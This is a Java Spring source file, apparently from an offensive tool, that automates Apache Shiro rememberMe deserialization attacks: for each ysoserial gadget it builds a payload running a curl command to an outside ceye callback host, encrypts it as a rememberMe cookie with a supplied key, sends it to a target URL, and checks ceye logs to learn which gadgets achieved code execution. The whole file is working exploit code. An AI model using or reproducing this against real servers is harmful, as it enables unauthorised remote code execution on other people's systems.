package com.madao.jvav.util;

import com.madao.jvav.pojo.Ceye;
import com.madao.jvav.pojo.Payloads;
import com.madao.jvav.service.WebSocketService;
import org.json.JSONException;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


@Component
public class VerifyGadget {

    private List<String> validGadgets;

    @Autowired
    private Ceye ceye;

    public List<String> getValidGadget(Payloads payloads) throws IOException, JSONException, InterruptedException {

        List<String> toVerifyGadgets = payloads.getPayloadList();
        String key = payloads.getKey();
        String url = payloads.getUrl();

        //获取随机数
        Map idAndGadget = new HashMap();

        String address = ceye.getIdentifier();
        String token = ceye.getToken();


        // 遍历所有gadget
        for (String gadget : toVerifyGadgets) {

            String randomId = Function.randomId();
            idAndGadget.put(gadget, randomId);

            String curlCeyeUrl = "curl http://" + randomId + "." + address;
            String command = "java -jar ysoserial.jar " + gadget + " \"" + curlCeyeUrl + "\"";
            WebSocketService.sendMessage("[>] Trying Gadget: "+gadget);
            byte[] payloadByte = Function.getExecByte(command);
            String rememberMeCookie = Function.getRememberMeCookie(payloadByte, key);

            try {
                Function.getDeleteMeCount(url, rememberMeCookie);
            } catch (Exception e) {
                e.printStackTrace();
            }

        }

        //获取结果
        WebSocketService.sendMessage("[%] Analyse...");
        Thread.sleep(18000);
        boolean isFind = false;
        for (String gadget : toVerifyGadgets) {

            String id = (String) idAndGadget.get(gadget);
            if( Function.ceyeRespDataLen(id, token) > 0) {
                isFind = true;
                WebSocketService.sendMessage("[+] Find Gadget: " + gadget);
            }
        }

        if (!isFind) {
            WebSocketService.sendMessage("[-] 未找到可利用的 Gadget");
        }

        return validGadgets;

    }

}
